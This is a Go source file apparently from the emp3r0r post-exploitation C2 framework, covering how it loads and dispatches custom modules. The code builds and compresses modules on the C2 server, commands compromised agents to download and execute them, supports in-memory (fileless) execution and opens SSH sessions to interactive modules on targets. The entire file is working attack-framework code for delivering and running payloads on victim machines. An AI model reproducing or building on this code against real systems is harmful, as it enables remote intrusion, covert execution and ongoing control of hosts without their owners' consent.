package modules

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/google/uuid"
	"github.com/jm33-m0/arc/v2"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/cli"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// moduleCustom run a custom module
func moduleCustom() {
	if live.ActiveModule == nil {
		logging.Warningf("No module selected")
		return
	}
	config, exists := def.Modules[live.ActiveModule.Name]
	if !exists {
		logging.Errorf("Config of %s does not exist", live.ActiveModule)
		return
	}

	// build module on C2
	if config.Build != "" {
		logging.Printf("Building %s...", config.Name)
		out, err := build_module(config)
		if err != nil {
			logging.Errorf("Build module %s: %v", config.Name, err)
			return
		}
		logging.Printf("Module output:\n%s", out)
	}

	// if module is a plugin, no need to upload and execute files on target
	if config.IsLocal {
		logging.Printf("%s will run as a plugin on C2, no files will be executed on target", config.Name)
		return
	}

	// where to download the module, can be from C2 or other agents, see `listener`
	download_addr := getDownloadAddr()

	// agent side configs
	payload_type, exec_cmd, envStr, err := genModStartCmd(config)
	if err != nil {
		logging.Errorf("Parsing module config: %v", err)
		return
	}

	// instead of capturing the output of the command, we use ssh to access the interactive shell provided by the module
	if config.AgentConfig.IsInteractive {
		exec_cmd = fmt.Sprintf("echo %s", strconv.Quote(crypto.SHA256SumRaw([]byte(def.MagicString))))
	}

	// if in-memory module
	if config.AgentConfig.InMemory {
		handleInMemoryModule(*config, payload_type, envStr, download_addr)
		return
	}

	// other modules that need to be saved to disk
	handleCompressedModule(*config, payload_type, exec_cmd, envStr, download_addr)
}

func build_module(config *def.ModuleConfig) (out []byte, err error) {
	err = os.Chdir(config.Path)
	if err != nil {
		return
	}
	defer os.Chdir(live.EmpWorkSpace)

	for _, opt := range live.ActiveModule.Options {
		if opt == nil {
			continue
		}
		// Environment variables need to be in uppercase
		os.Setenv(opt.Name, opt.Val)
	}

	// build module
	out, err = exec.Command("sh", "-c", config.Build).CombinedOutput()
	if err != nil {
		err = fmt.Errorf("%s (%v)", out, err)
		return
	}

	return
}

func getDownloadAddr() string {
	download_url_opt, ok := live.ActiveModule.Options["download_addr"]
	if ok {
		return download_url_opt.Val
	}
	return ""
}

func handleInMemoryModule(config def.ModuleConfig, payload_type, envStr, download_addr string) {
	hosted_file := live.WWWRoot + live.ActiveModule.Name + ".xz"
	logging.Infof("Compressing %s with xz...", live.ActiveModule.Name)

	// only one file is allowed
	if len(config.AgentConfig.Files) == 0 {
		logging.Errorf("No files found for module %s in %s", config.Name, config.Path)
		return
	}
	path := fmt.Sprintf("%s/%s", config.Path, config.AgentConfig.Files[0])
	data, err := os.ReadFile(path)
	if err != nil {
		logging.Errorf("Reading %s: %v", path, err)
		return
	}
	compressedBytes, err := arc.CompressXz(data)
	if err != nil {
		logging.Errorf("Compressing %s: %v", path, err)
		return
	}
	logging.Infof("Created %.4fMB archive (%s) for module '%s'", float64(len(compressedBytes))/1024/1024, hosted_file, live.ActiveModule.Name)
	err = os.WriteFile(hosted_file, compressedBytes, 0o600)
	if err != nil {
		logging.Errorf("Writing %s: %v", hosted_file, err)
		return
	}
	cmd := fmt.Sprintf("%s --mod_name %s --type %s --file_to_download %s --checksum %s --in_mem --env \"%s\"",
		def.C2CmdCustomModule, live.ActiveModule.Name, payload_type, util.FileBaseName(hosted_file), crypto.SHA256SumFile(hosted_file), envStr)
	if download_addr != "" {
		cmd += fmt.Sprintf(" --download_addr %s", strconv.Quote(download_addr))
	}
	cmd_id := uuid.NewString()
	logging.Debugf("Sending command %s to %s", cmd, live.ActiveAgent.Tag)
	err = CmdSender(cmd, cmd_id, live.ActiveAgent.Tag)
	if err != nil {
		logging.Errorf("Sending command %s to %s: %v", cmd, live.ActiveAgent.Tag, err)
	}
}

func handleCompressedModule(config def.ModuleConfig, payload_type, exec_cmd, envStr, download_addr string) {
	tarball_path := live.WWWRoot + live.ActiveModule.Name + ".tar.xz"
	file_to_download := filepath.Base(tarball_path)
	if !util.IsFileExist(tarball_path) {
		logging.Infof("Compressing %s with tar.xz...", live.ActiveModule.Name)
		path := config.Path
		err := util.TarXZ(path, tarball_path)
		if err != nil {
			logging.Errorf("Compressing %s: %v", live.ActiveModule.Name, err)
			return
		}
		logging.Infof("Created %.4fMB archive (%s) for module '%s'",
			float64(util.FileSize(tarball_path))/1024/1024, tarball_path, live.ActiveModule.Name)
	} else {
		logging.Infof("Using cached %s", tarball_path)
	}

	checksum := crypto.SHA256SumFile(tarball_path)
	cmd := fmt.Sprintf("%s --mod_name %s --checksum %s --env \"%s\" --type %s --file_to_download %s --exec \"%s\"",
		def.C2CmdCustomModule,
		live.ActiveModule.Name, checksum, envStr, payload_type, file_to_download, exec_cmd)
	if download_addr != "" {
		cmd += fmt.Sprintf(" --download_addr %s", strconv.Quote(download_addr))
	}
	cmd_id := uuid.NewString()
	err := CmdSender(cmd, cmd_id, live.ActiveAgent.Tag)
	if err != nil {
		logging.Errorf("Sending command %s to %s: %v", cmd, live.ActiveAgent.Tag, err)
	}

	if config.AgentConfig.IsInteractive {
		handleInteractiveModule(config, cmd_id)
	}
}

func handleInteractiveModule(config def.ModuleConfig, cmd_id string) {
	opt, exists := config.Options["args"]
	if !exists {
		config.Options["args"] = &def.ModOption{
			Name: "args",
			Desc: "run this command with these arguments",
			Val:  "",
			Vals: []string{},
		}
	}
	args := opt.Val
	port := strconv.Itoa(util.RandInt(1024, 65535))
	look_for := crypto.SHA256SumRaw([]byte(def.MagicString))

	for i := 0; i < 10; i++ {
		if res, ok := live.CmdResults.Load(cmd_id); ok {
			if strings.Contains(res.(string), look_for) {
				break
			}
		}
		util.TakeABlink()
	}
	defer func() {
		live.CmdResults.Delete(cmd_id)
	}()

	sshErr := SSHClient(fmt.Sprintf("%s/%s/%s",
		live.RuntimeConfig.AgentRoot, live.ActiveModule.Name, config.AgentConfig.Exec),
		args, port, false)
	if sshErr != nil {
		logging.Errorf("module %s: %v", config.Name, sshErr)
	}
}

// Print module meta data
func ModuleDetails(modName string) {
	config, exists := def.Modules[modName]
	if !exists {
		return
	}

	// build table using helper function
	header := []string{"Name", "Exec", "Platform", "Author", "Date", "Comment"}
	rows := [][]string{
		{config.Name, config.AgentConfig.Exec, config.Platform, config.Author, config.Date, config.Comment},
	}

	tableStr := cli.BuildTable(header, rows)
	cli.AdaptiveTable(tableStr)
	logging.Printf("Module details:\n%s", tableStr)
}

// scan custom modules in ModuleDir,
// and update ModuleHelpers, ModuleDocs
func InitModules() {
	if !util.IsExist(live.WWWRoot) {
		os.MkdirAll(live.WWWRoot, 0o700)
	}

	load_mod := func(mod_search_dir string) {
		// don't bother if module dir not found
		if !util.IsExist(mod_search_dir) {
			return
		}
		logging.Debugf("Scanning %s for modules", mod_search_dir)
		dirs, readdirErr := os.ReadDir(mod_search_dir)
		if readdirErr != nil {
			logging.Errorf("Failed to scan custom modules: %v", readdirErr)
			return
		}
		for _, dir := range dirs {
			if !dir.IsDir() {
				continue
			}
			config_file := fmt.Sprintf("%s/%s/config.json", mod_search_dir, dir.Name())
			if !util.IsExist(config_file) {
				continue
			}
			config, readConfigErr := readModCondig(config_file)
			if readConfigErr != nil {
				logging.Warningf("Reading config from %s: %v", dir.Name(), readConfigErr)
				continue
			}

			// module path, eg. ~/.emp3r0r/modules/foo
			config.Path = fmt.Sprintf("%s/%s", mod_search_dir, dir.Name())
			if config.IsLocal {
				mod_dir := fmt.Sprintf("%s/modules/%s", live.EmpWorkSpace, dir.Name())
				err := os.MkdirAll(mod_dir, 0o700)
				if err != nil {
					logging.Warningf("Failed to create %s: %v", mod_dir, err)
					continue
				}
				err = util.Copy(config.Path, mod_dir)
				if err != nil {
					logging.Warningf("Copying %s to %s: %v", config.Path, mod_dir, err)
					continue
				}
				config.Path = mod_dir
			}

			// add to module helpers
			ModuleRunners[config.Name] = moduleCustom

			// add module meta data
			def.Modules[config.Name] = config

			readConfigErr = updateModuleHelp(config)
			if readConfigErr != nil {
				logging.Warningf("Loading config from %s: %v", config.Name, readConfigErr)
				continue
			}
			def.Modules[config.Name] = config
			logging.Debugf("Loaded module %s", strconv.Quote(config.Name))
		}
	}

	// read from every defined module dir
	for _, mod_search_dir := range live.ModuleDirs {
		load_mod(mod_search_dir)
	}

	logging.Printf("Loaded %d modules", len(def.Modules))
}

// readModCondig read config.json of a module
func readModCondig(file string) (pconfig *def.ModuleConfig, err error) {
	// read JSON
	jsonData, err := os.ReadFile(file)
	if err != nil {
		return nil, fmt.Errorf("read %s: %v", file, err)
	}

	// parse the json
	var raw map[string]interface{}
	err = json.Unmarshal(jsonData, &raw)
	if err != nil {
		return nil, fmt.Errorf("failed to unmarshal JSON config: %v", err)
	}

	config := def.ModuleConfig{}

	// Helper to safely extract string
	getString := func(m map[string]interface{}, key string) string {
		if val, ok := m[key].(string); ok {
			return val
		}
		return ""
	}

	// Helper to safely extract bool
	getBool := func(m map[string]interface{}, key string) bool {
		if val, ok := m[key].(bool); ok {
			return val
		}
		return false
	}

	// Helper to safely extract string slice
	getStringSlice := func(m map[string]interface{}, key string) []string {
		if val, ok := m[key].([]interface{}); ok {
			var res []string
			for _, v := range val {
				if s, ok := v.(string); ok {
					res = append(res, s)
				}
			}
			return res
		}
		return []string{}
	}

	config.Name = getString(raw, "name")
	config.Build = getString(raw, "build")
	config.Author = getString(raw, "author")
	config.Date = getString(raw, "date")
	config.Comment = getString(raw, "comment")
	config.IsLocal = getBool(raw, "is_local")
	config.Platform = getString(raw, "platform")
	config.Path = getString(raw, "path")
	config.Fileless = getBool(raw, "fileless")

	// AgentConfig
	if agentConfigMap, ok := raw["agent_config"].(map[string]interface{}); ok {
		config.AgentConfig.Exec = getString(agentConfigMap, "exec")
		config.AgentConfig.Files = getStringSlice(agentConfigMap, "files")
		config.AgentConfig.InMemory = getBool(agentConfigMap, "in_memory")
		config.AgentConfig.Type = getString(agentConfigMap, "type")
		config.AgentConfig.IsInteractive = getBool(agentConfigMap, "interactive")
	}

	// Options
	config.Options = make(def.ModOptions)
	if optionsMap, ok := raw["options"].(map[string]interface{}); ok {
		for key, val := range optionsMap {
			if optMap, ok := val.(map[string]interface{}); ok {
				opt := &def.ModOption{}
				opt.Name = getString(optMap, "opt_name")
				opt.Desc = getString(optMap, "opt_desc")
				opt.Val = getString(optMap, "opt_val")
				opt.Vals = getStringSlice(optMap, "opt_vals")
				config.Options[key] = opt
			}
		}
	}

	pconfig = &config
	return
}

// genModStartCmd reads config.json of a module and generates env string (VAR=value,VAR2=value2 ...)
func genModStartCmd(config *def.ModuleConfig) (payload_type, exec_path, envStr string, err error) {
	exec_path = config.AgentConfig.Exec
	payload_type = config.AgentConfig.Type
	var builder strings.Builder

	setEnvVar := func(opt, value string) {
		fmt.Fprintf(&builder, "%s=%s,", opt, value)
	}
	for opt, modOption := range config.Options {
		setEnvVar(opt, modOption.Val)
	}

	envStr = builder.String()

	return
}

func updateModuleHelp(config *def.ModuleConfig) error {
	help_map := make(map[string]*def.ModOption)
	for opt, modOption := range config.Options {
		if modOption.Desc == "" {
			return fmt.Errorf("%s config error: %s incomplete", config.Name, opt)
		}
		help_map[opt] = modOption
		def.Modules[config.Name].Options = help_map
	}
	return nil
}
